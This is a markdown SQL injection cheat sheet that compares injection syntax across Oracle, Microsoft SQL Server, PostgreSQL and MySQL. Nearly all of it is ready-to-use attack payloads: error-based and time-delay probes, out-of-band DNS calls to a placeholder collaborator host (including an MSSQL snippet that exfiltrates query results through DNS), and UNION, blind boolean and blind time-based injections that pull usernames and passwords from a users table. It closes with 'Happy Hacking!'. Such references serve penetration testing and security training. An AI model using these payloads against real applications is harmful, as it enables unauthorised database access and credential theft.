
# 🐍 SQL Injection Cheat Sheet

> **Quick reference** for SQL injection commands across different database systems.



## 📊 Database Comparison

| Function | Oracle | Microsoft | PostgreSQL | MySQL |
|----------|--------|-----------|------------|-------|
| **String Concatenation** | `'foo'||'bar'` | `'foo'+'bar'` | `'foo'||'bar'` | `CONCAT('foo','bar')` |
| **Substring Extraction** | `SUBSTR('foobar',4,2)` | `SUBSTRING('foobar',4,2)` | `SUBSTRING('foobar',4,2)` | `SUBSTRING('foobar',4,2)` |
| **Comments** | `--comment` | `--comment` | `--comment` | `#comment` |
| **Version** | `SELECT banner FROM v$version` | `SELECT @@version` | `SELECT version()` | `SELECT @@version` |
| **Delay** | `dbms_pipe.receive_message(('a'),10)` | `WAITFOR DELAY '0:0:10'` | `SELECT pg_sleep(10)` | `SELECT SLEEP(10)` |

---

## 🔍 Basic Queries

### Listing Tables
```sql
-- Oracle
SELECT * FROM all_tables

-- Microsoft / PostgreSQL / MySQL
SELECT * FROM information_schema.tables
```

### Listing Columns
```sql
-- Oracle
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME'

-- Microsoft / PostgreSQL / MySQL
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME'
```

---

## ⚠️ Conditional Errors

```sql
-- Oracle
SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual

-- Microsoft
SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END

-- PostgreSQL
1 = (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)

-- MySQL
SELECT IF(1=1,(SELECT table_name FROM information_schema.tables),'a')
```

---

## ⏱️ Conditional Delays

```sql
-- Oracle
SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual

-- Microsoft
IF (1=1) WAITFOR DELAY '0:0:10'

-- PostgreSQL
SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END

-- MySQL
SELECT IF(1=1,SLEEP(10),'a')
```

---

## 🌐 DNS Queries

```sql
-- Microsoft (Windows)
exec master..xp_dirtree '//BURP-COLLABORATOR/a'

-- PostgreSQL
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR'

-- MySQL (Windows)
LOAD_FILE('\\\\BURP-COLLABORATOR\\a')
```

### Data Exfiltration via DNS
```sql
-- Microsoft
declare @p varchar(1024);
set @p=(SELECT YOUR-QUERY-HERE);
exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR/a"')
```

---

## 📝 Practical Examples

### 1. Union Based Injection
```sql
' UNION SELECT null,null,table_name FROM information_schema.tables --
' UNION SELECT null,null,column_name FROM information_schema.columns WHERE table_name='users' --
' UNION SELECT null,username,password FROM users --
```

### 2. Error Based Injection
```sql
' AND 1=CONVERT(int, (SELECT TOP 1 username FROM users)) --
' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT password FROM users LIMIT 1))) --
```

### 3. Blind Boolean Injection
```sql
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' --
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 97 --
```

### 4. Blind Time Based Injection
```sql
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(5), 0) --
' AND (SELECT CASE WHEN SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' THEN pg_sleep(5) ELSE pg_sleep(0) END) --
```

---

## 🛠️ Useful Tools

| Tool | Description |
|------|-------------|
| **SQLMap** | Automated tool for detecting and exploiting SQLi vulnerabilities |
| **Burp Suite** | Intercepting and modifying HTTP requests |
| **Havij** | Graphical tool for exploiting SQLi |
| **sqlsus** | Advanced command-line tool |

---

## 📚 Useful References

- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQL Injection Cheat Sheet - Netsparker](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)

---

**🐍 Happy Hacking!**
